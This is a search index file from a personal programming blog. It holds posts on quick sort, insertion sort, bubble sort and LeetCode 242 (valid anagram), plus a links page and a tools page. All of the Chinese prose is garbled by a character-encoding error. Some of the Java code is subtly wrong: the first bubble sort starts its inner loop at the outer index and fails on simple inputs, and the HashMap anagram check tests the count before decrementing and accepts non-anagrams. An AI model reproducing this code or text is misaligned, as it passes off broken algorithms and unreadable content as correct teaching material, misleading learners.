å±‚çš„å¤§å°åˆ‡åˆ†ã€‚åœ¨æ¯ä¸€å±‚é‡Œï¼Œæˆ‘ä»¬éƒ½è¦è¿›è¡Œåˆå¹¶ï¼Œæ‰€æ¶‰åŠåˆ°çš„å…ƒç´ å…¶å®å°±æ˜¯æ•°ç»„é‡Œçš„æ‰€æœ‰å…ƒç´ ï¼Œå› æ­¤ï¼Œæ¯ä¸€å±‚çš„åˆå¹¶å¤æ‚åº¦éƒ½æ˜¯ O(n)ï¼Œæ‰€ä»¥æ•´ä½“çš„å¤æ‚åº¦å°±æ˜¯Â O(nlogn)ã€‚\nEND!\n"},{"id":86,"href":"/posts/history/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/","title":"å¿«é€Ÿæ’åº","section":"æˆ‘çš„åšå®¢","content":"åŸºæœ¬æ€æƒ³ å¿«é€Ÿæ’åºä¹Ÿé‡‡ç”¨äº†åˆ†æ²»çš„æ€æƒ³ã€‚\nå®ç° éšæœºæŠŠä¸€ä¸ªæ•°ä½œä¸ºåŸºå‡†ï¼ˆä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸€ä¸ªæ•°ï¼‰ï¼ŒæŠŠåŸå§‹çš„æ•°ç»„ç­›é€‰æˆè¾ƒå°å’Œè¾ƒå¤§çš„ä¸¤ä¸ªå­æ•°ç»„ï¼Œç„¶åé€’å½’åœ°æ’åºä¸¤ä¸ªå­æ•°ç»„ã€‚\næ­¥éª¤åˆ†è§£ Javaä»£ç \npublic void quickSort(int[] nums, int left, int right) { if (left \u0026gt;= right) { return; } // æ‰¾å‡ºåŸºå‡†åˆ†å‰²ç•Œç‚¹ int middle = helper(nums, left, right); // å·¦è¾¹ç»§ç»­æ’åº quickSort(nums,left, middle-1); // å³è¾¹ç»§ç»­æ’åº quickSort(nums, middle+1,right); } private int helper(int[] nums, int left, int right) { // ä»¥valä¸ºåŸºå‡†ï¼ŒæŠŠæ¯”valå¤§çš„æ•°æ”¾ä¸€è¾¹ï¼Œæ¯”valå°çš„æ•°æ”¾ä¸€è¾¹ int val = nums[left]; while (left \u0026lt; right) { while (val \u0026lt;= nums[right] \u0026amp;\u0026amp; left \u0026lt; right) { right--; } nums[left] = nums[right]; while (val \u0026gt;= nums[left] \u0026amp;\u0026amp; left \u0026lt; right) { left++; } nums[right] = nums[left]; } nums[left] = val; return left; } æ—¶é—´å¤æ‚åº¦\næœ€ä¼˜æƒ…å†µï¼šè¢«é€‰å‡ºæ¥çš„åŸºå‡†å€¼éƒ½æ˜¯å½“å‰å­æ•°ç»„çš„ä¸­é—´æ•°ã€‚ è¿™æ ·çš„åˆ†å‰²ï¼Œèƒ½ä¿è¯å¯¹äºä¸€ä¸ªè§„æ¨¡å¤§å°ä¸º n çš„é—®é¢˜ï¼Œèƒ½è¢«å‡åŒ€åˆ†è§£æˆä¸¤ä¸ªè§„æ¨¡å¤§å°ä¸º n/2 çš„å­é—®é¢˜ï¼ˆå½’å¹¶æ’åºä¹Ÿé‡‡ç”¨äº†ç›¸åŒçš„åˆ’åˆ†æ–¹æ³•ï¼‰ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯ï¼šT(n) = 2Ã—T(n/2) + O(n)ã€‚ æŠŠè§„æ¨¡å¤§å°ä¸º n çš„é—®é¢˜åˆ†è§£æˆ n/2 çš„ä¸¤ä¸ªå­é—®é¢˜æ—¶ï¼Œå’ŒåŸºå‡†å€¼è¿›è¡Œäº† n-1 æ¬¡æ¯”è¾ƒï¼Œå¤æ‚åº¦å°±æ˜¯ O(n)ã€‚å¾ˆæ˜¾ç„¶ï¼Œåœ¨æœ€ä¼˜æƒ…å†µä¸‹ï¼Œå¿«é€Ÿæ’åºçš„å¤æ‚åº¦ä¹Ÿæ˜¯Â O(nlogn)ã€‚\næœ€åæƒ…å†µï¼šåŸºå‡†å€¼é€‰æ‹©äº†å­æ•°ç»„é‡Œçš„æœ€å¤§æˆ–è€…æœ€å°å€¼ æ¯æ¬¡éƒ½æŠŠå­æ•°ç»„åˆ†æˆäº†ä¸¤ä¸ªæ›´å°çš„å­æ•°ç»„ï¼Œå…¶ä¸­ä¸€ä¸ªçš„é•¿åº¦ä¸º 1ï¼Œå¦å¤–ä¸€ä¸ªçš„é•¿åº¦åªæ¯”åŸå­æ•°ç»„å°‘ 1ã€‚ç®—æ³•å¤æ‚åº¦ä¸ºÂ O(n2)ã€‚\nEND!\n"},{"id":87,"href":"/posts/history/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/","title":"æ’å…¥æ’åº","section":"æˆ‘çš„åšå®¢","content":"åœ¨å†’æ³¡æ’åºä¸­ï¼Œç»è¿‡æ¯ä¸€è½®çš„æ’åºå¤„ç†åï¼Œæ•°ç»„åç«¯çš„æ•°æ˜¯æ’å¥½åºçš„ï¼›è€Œå¯¹äºæ’å…¥æ’åºæ¥è¯´ï¼Œç»è¿‡æ¯ä¸€è½®çš„æ’åºå¤„ç†åï¼Œæ•°ç»„å‰ç«¯çš„æ•°éƒ½æ˜¯æ’å¥½åºçš„ã€‚\nåŸºæœ¬æ€è·¯ï¼šå½“è¿­ä»£åˆ°iæ—¶ï¼Œä¼šå‘å‰æ¯”è¾ƒï¼Œæ’å…¥åˆ°åˆé€‚çš„ä½ç½®ï¼ˆå»åœ¨çº¿ç®—æ³•æ¼”ç¤ºä½“ä¼šï¼‰ã€‚\nJavaä»£ç \npublic void insertionSort(int[] nums) { for (int i = 1; i \u0026lt; nums.length; i++) { for (int j = i; j \u0026gt;= 1; j--) { if (nums[j-1] \u0026lt; nums[j]) { break; } int tmp = nums[j-1]; nums[j-1] = nums[j]; nums[j] = tmp; } } } ç©ºé—´å¤æ‚åº¦\nå‡è®¾æ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œç”±äºåœ¨æ•´ä¸ªæ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯ç›´æ¥åœ¨ç»™å®šçš„æ•°ç»„é‡Œé¢è¿›è¡Œå…ƒç´ çš„ä¸¤ä¸¤äº¤æ¢ï¼Œç©ºé—´å¤æ‚åº¦æ˜¯ O(1)ã€‚\næ—¶é—´å¤æ‚åº¦\nç»™å®šçš„æ•°ç»„æŒ‰ç…§é¡ºåºå·²ç»æ’å¥½ åªéœ€è¦è¿›è¡Œ n-1 æ¬¡çš„æ¯”è¾ƒï¼Œä¸¤ä¸¤äº¤æ¢æ¬¡æ•°ä¸º 0ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚è¿™æ˜¯æœ€å¥½çš„æƒ…å†µã€‚\nç»™å®šçš„æ•°ç»„æŒ‰ç…§é€†åºæ’åˆ— åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œ n(n-1)/2 æ¬¡æ¯”è¾ƒï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯Â O(n2)ã€‚è¿™æ˜¯æœ€åçš„æƒ…å†µã€‚\nç»™å®šçš„æ•°ç»„æ‚ä¹±æ— ç«  åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯Â O(n2)ã€‚\nç”±æ­¤å¯è§ï¼Œå’Œå†’æ³¡æ’åºä¸€æ ·ï¼Œæ’å…¥æ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯Â O(n2)ï¼Œå¹¶ä¸”å®ƒä¹Ÿæ˜¯ä¸€ç§ç¨³å®šçš„æ’åºç®—æ³•ã€‚\nç»ƒä¹ é¢˜ç›®ï¼šLeetCode ç¬¬ 147 é¢˜\nEND!\n"},{"id":88,"href":"/posts/history/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/","title":"å†’æ³¡æ’åº","section":"æˆ‘çš„åšå®¢","content":"å†’æ³¡æ’åºæ˜¯éå¸¸ç®€å•çš„ä¸€ç§æ’åºï¼Œæˆ‘ä»¬åªéœ€æ±‚çŸ¥é“ä»–æ˜¯æ€æ ·äº¤æ¢çš„å°±å¯ä»¥äº†ã€‚\nåŸºæœ¬è§„åˆ™ï¼šä»å·¦åˆ°å³ä¾æ¬¡æ¯”è¾ƒï¼ŒæŠŠæœ€å¤§çš„æ•°æ”¾åˆ°å³è¾¹ï¼Œä¾æ¬¡è¿­ä»£ï¼ˆå…ˆæ˜¯ä¿è¯æœ«ç«¯æ’å¥½ï¼Œå†å‘å‰è¿­ä»£ï¼‰ã€‚å¯ä»¥æ‰¾ä¸ªâ€œåœ¨çº¿ç®—æ³•æ¼”ç¤ºâ€è¿›è¡Œä½“ä¼šã€‚\nJavaä»£ç \npublic void bubbleSort(int[] nums) { for (int i = 0; i \u0026lt; nums.length-1; i++) { for (int j = i; j \u0026lt; nums.length-1; j++) { if(nums[j] \u0026gt; nums[j+1]) { int tmp = nums[j]; nums[j] = nums[j+1]; nums[j+1] = tmp; } } } } é‚£è¿˜æœ‰æ²¡æœ‰å¾—ä¼˜åŒ–çš„å‘¢ï¼Ÿç»“æœæ˜¯å½“ç„¶çš„ã€‚å½“å†’æ³¡è¿˜æ²¡æœ‰å®Œæˆæ—¶ï¼Œå·²ç»æ’å¥½åºäº†ã€‚è¿™æ—¶ï¼Œå¦‚æœè¿˜ç»§ç»­å†’æ³¡ä¼šæµªè´¹æ—¶é—´ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªflagè¿›è¡ŒçŠ¶æ€çš„è®°å½•ã€‚\npublic void bubbleSort2(int[] nums) { for (int i = 0; i \u0026lt; nums.length-1; i++) { boolean flag = true; for (int j = i; j \u0026lt; nums.length-1; j++) { if(nums[j] \u0026gt; nums[j+1]) { int tmp = nums[j]; nums[j] = nums[j+1]; nums[j+1] = tmp; flag = false; } } if (flag) return; } } ç©ºé—´å¤æ‚åº¦\nå‡è®¾æ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œç”±äºåœ¨æ•´ä¸ªæ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ˜¯ç›´æ¥åœ¨ç»™å®šçš„æ•°ç»„é‡Œé¢è¿›è¡Œå…ƒç´ çš„ä¸¤ä¸¤äº¤æ¢ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦æ˜¯ O(1)ã€‚\næ—¶é—´å¤æ‚åº¦\nç»™å®šçš„æ•°ç»„æŒ‰ç…§é¡ºåºå·²ç»æ’å¥½ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡Œ nâˆ’1 æ¬¡çš„æ¯”è¾ƒï¼Œä¸¤ä¸¤äº¤æ¢æ¬¡æ•°ä¸º 0ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚è¿™æ˜¯æœ€å¥½çš„æƒ…å†µã€‚\nç»™å®šçš„æ•°ç»„æŒ‰ç…§é€†åºæ’åˆ— åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œ n(n-1)/2 æ¬¡æ¯”è¾ƒï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚è¿™æ˜¯æœ€åçš„æƒ…å†µã€‚\nç»™å®šçš„æ•°ç»„æ‚ä¹±æ— ç«  åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚\nç”±æ­¤å¯è§ï¼Œå†’æ³¡æ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚å®ƒæ˜¯ä¸€ç§ç¨³å®šçš„æ’åºç®—æ³•ã€‚\nEND!\n"},{"id":89,"href":"/posts/history/leetcode242.%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/","title":"Leetcode242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯","section":"æˆ‘çš„åšå®¢","content":"é¢˜ç›®\nç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s å’Œ t ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­ t æ˜¯å¦æ˜¯ s çš„å­—æ¯å¼‚ä½è¯ã€‚ ç¤ºä¾‹Â 1: è¾“å…¥: s = \u0026#34;anagram\u0026#34;, t = \u0026#34;nagaram\u0026#34; è¾“å‡º: true ç¤ºä¾‹ 2: è¾“å…¥: s = \u0026#34;rat\u0026#34;, t = \u0026#34;car\u0026#34; è¾“å‡º: false è¯´æ˜: ä½ å¯ä»¥å‡è®¾å­—ç¬¦ä¸²åªåŒ…å«å°å†™å­—æ¯ã€‚ è¿›é˜¶: å¦‚æœè¾“å…¥å­—ç¬¦ä¸²åŒ…å« unicode å­—ç¬¦æ€ä¹ˆåŠï¼Ÿä½ èƒ½å¦è°ƒæ•´ä½ çš„è§£æ³•æ¥åº”å¯¹è¿™ç§æƒ…å†µï¼Ÿ é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­—æ¯çš„ç‰¹æ€§ï¼Œåªæœ‰26ä¸ªå­—æ¯ã€‚ 1ã€æˆ‘ä»¬å¯ä»¥å»ºç«‹ä¸€ä¸ª26ä½å¤§å°çš„æ•°ç»„ä½œä¸ºè®¡æ•°å™¨ã€‚ 2ã€éå†Sï¼ŒæŠŠå…¶ä¸­çš„å­—æ¯æ”¾å…¥åˆ°è®¡æ•°å™¨ä¸­ã€‚ 3ã€éå†Tï¼ŒæŠŠå¯¹åº”çš„å­—æ¯ä»è®¡æ•°å™¨ä¸­å‡å°‘ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦åˆç†ã€‚\nä»£ç \npublic boolean isAnagram(String s, String t) { if(s.length() != t.length()) { return false; } int[] counter = new int[26]; for (int i = 0; i \u0026lt; s.length(); i++) { counter[s.charAt(i) - \u0026#39;a\u0026#39;]++; } for (int i = 0; i \u0026lt; t.length(); i++) { if (--counter[t.charAt(i) - \u0026#39;a\u0026#39;] \u0026lt; 0) { return false; } } return true; } é’ˆå¯¹å¦‚æœæˆ‘ä»¬åœ¨ä¸ç¡®å®šå­—ç¬¦çš„èŒƒå›´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Hashæ¥æ›¿æ¢æ•°ç»„ï¼Œå»é™¤å¤§å°ä¸ªæ•°çš„é™å®šã€‚\nè¿™æ˜¯ä½¿ç”¨HashMapè¿›è¡Œæ”¹é€ ï¼š\npublic boolean isAnagram(String s, String t) { if(s.length() != t.length()) { return false; } Map\u0026lt;Character,Integer\u0026gt; counter = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; s.length(); i++) { Integer mun = counter.getOrDefault(s.charAt(i), 0); counter.put(s.charAt(i), mun + 1); } for (int i = 0; i \u0026lt; t.length(); i++) { Integer mun = counter.getOrDefault(t.charAt(i), 0); counter.put(t.charAt(i), mun - 1); if ( mun \u0026lt; 0) { return false; } } return true; } "},{"id":90,"href":"/links/","title":"Links","section":"Introduction","content":"\rå‹æƒ…é“¾æ¥\r#\rgrayfen leoon å†°èŒ¶çš„ç³–æœç½ ç”·ç‰ˆè¿ªå£«å°¼ æŠ€æœ¯æ–‡ç« \r#\rSpring ç¨‹åºå‘˜DD ä¸€äº›Springç”Ÿæ€çš„æ•™ç¨‹ï¼ˆæ¨èçœ‹ï¼‰ ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ æœ‰èµæŠ€æœ¯å›¢é˜Ÿ äº¬ä¸œç§‘æŠ€æŠ€æœ¯è¯´ é˜¿é‡ŒæŠ€æœ¯ é˜¿é‡Œå·´å·´ä¸­é—´ä»¶ eBay æŠ€æœ¯èŸ ThoughtWorks æ´è§ çˆ±å¥‡è‰ºæŠ€æœ¯äº§å“å›¢é˜Ÿ å°ç±³ä¿¡æ¯éƒ¨æŠ€æœ¯å›¢é˜Ÿ 360 æ ¸å¿ƒå®‰å…¨æŠ€æœ¯åšå®¢ ä¼´é±¼æŠ€æœ¯å›¢é˜Ÿ æ»´æ»´æŠ€æœ¯ vivo äº’è”ç½‘æŠ€æœ¯ å­—èŠ‚è·³åŠ¨æŠ€æœ¯å›¢é˜Ÿ ç®—æ³•ç½‘ç«™\r#\rLeetCode æ•°æ®ç»“æ„ç®—æ³•åœ¨çº¿æ¼”ç¤º å¸¸ç”¨ï¼Œè®¿é—®æ¯”è¾ƒå¿«ï¼ æ•°æ®ç»“æ„æ¼”ç¤º ç®—æ³•æ¼”ç¤º LintCodeç®—æ³• è§†é¢‘ç½‘ç«™\r#\rè±†ç“£ç”µå½± æŸ¥çœ‹ç”µå½±ç”µè§†æ’å BTç”µå½±å¤©å ‚ ç”µå½±ä¸‹è½½ ä¸”å¬é£åŸ ç”µå½±è§†é¢‘ä¸‹è½½ç½‘ç«™ å¸¸ç”¨å·¥å…·\r#\réšæœºå­—ç¬¦ä¸² ç”¨äºç”Ÿæˆéšæœºå­—ç¬¦ä¸²å’Œå¯†ç ç­‰ä¿¡æ¯ï¼ æˆªå›¾è½¯ä»¶ ç”»å›¾è½¯ä»¶ GIFåˆ¶ä½œå·¥å…· è¿˜æ²¡æœ‰ç”¨è¿‡ï¼ä¸çŸ¥é“æ•ˆæœå¦‚ä½•ï¼ èµ„æºå¯¼èˆª ä¸‹è½½å·¥å…·-Aria2 It supports HTTP/HTTPS,FTP,SFTP,BitTorrent and Metalink. chrome ç¿»è¯‘æ’ä»¶ Dittoå‰ªè´´æ¿ web clipper æ™ºèƒ½æˆªå–é¡µé¢å†…å®¹ã€‚ FeHelper Webå‰ç«¯åŠ©æ‰‹ FeHelper Webå‰ç«¯åŠ©æ‰‹ JSONç¾åŒ–å·¥å…· éšæœºå¯†ç ç”Ÿæˆ ç®€æ˜“Postman æ—¶é—´(ç¿Ÿ)è½¬æ¢ é¡µé¢å–è‰²å·¥å…· Git Master Gitä»£ç ç›®å½•æ ‘æµè§ˆå·¥å…·ï¼Œæ”¯æŒGitHubé€šçŸ¥ï¼ŒGitæ–‡ä»¶å†å²å¯è§†åŒ–ã€‚å¼€å‘æ•ˆç‡å·¥å…·ï¼Œè®©ä»£ç æµè§ˆæ›´ä¾¿æ·ã€‚ jenkinsæ„å»ºæˆåŠŸæé†’ ç”µå­ä¹¦æŸ¥æ‰¾ æŠ€æœ¯ç¤¾åŒº\r#\rV2EX ç‰›å®¢ç½‘ é¢˜åº“ï¼Œå†…æ¨ï¼ˆç‰¹åˆ«æ˜¯æ ¡æ‹›-ä¸­å¤§å…¬å¸ï¼‰ï¼ SegmentFaultæ€å¦ stackoverflow æœç´¢é—®é¢˜ï¼Œæ‰¾ç­”æ¡ˆï¼ codeproject æœç´¢é—®é¢˜ï¼Œæ‰¾ç­”æ¡ˆï¼ä¸æ€ä¹ˆçœ‹ï¼ "},{"id":91,"href":"/tools/","title":"Tools","section":"Introduction","content":"\rå·¥å…·\r#\ræ‹¼éŸ³ éšæœºå­— "},{"id":92,"href":"/docs/blogs/plotly/examples/","title":"Visualization via plotly","section":"Plotly","content":"EXAMPLES\n"},{"id":93,"href":"/tools/%E6%8B%BC%E9%9F%B3/","title":"æ‹¼éŸ³","section":"Tools","content":" è‡ªå®šä¹‰ æœ€å¸¸ç”¨å­— å¸¸ç”¨å­— æ¬¡å¸¸ç”¨å­— æ‡’ï¼Œå°±éšæœºæ¥å‡ æ®µå§ å¸¸ç”¨å†…å®¹ è§£æ "},{"id":94,"href":"/tools/%E9%9A%8F%E6%9C%BA%E5%AD%97/","title":"éšæœºå­—","section":"Tools","content":" éšæœºå­— "}]